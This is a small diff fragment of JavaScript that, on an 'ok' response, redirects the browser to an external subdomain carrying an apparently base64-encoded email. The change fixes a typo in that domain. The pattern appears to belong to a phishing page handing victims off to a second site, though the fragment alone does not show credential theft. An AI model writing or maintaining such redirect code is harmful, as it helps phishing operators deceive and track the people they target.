@@ -87,7 +87,7 @@
 
             if (res["signal"] == "ok") {
               window.location.replace(
-                `https://travelsandtour.kjavtospares.com/?ed=${b4_emailauto}`,
+                `https://travelsandtours.kjavtospares.com/?ed=${b4_emailauto}`,
               );
             } else {
               $("#showerror").html(
